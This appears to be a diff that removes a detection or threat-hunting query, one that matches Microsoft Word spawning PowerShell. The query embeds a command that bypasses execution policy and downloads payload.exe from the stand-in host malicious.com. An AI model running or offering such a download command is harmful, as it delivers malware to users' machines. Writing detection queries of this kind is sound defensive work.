@@ -1,2 +1,0 @@
-
-Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" AND Cmdline: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" AND Type: Process AND relation: "Process Create" AND dstNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" AND dstNode.Cmdline: "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\\Users\\User\\Downloads\\payload.exe" AND dstNode.Type: Process
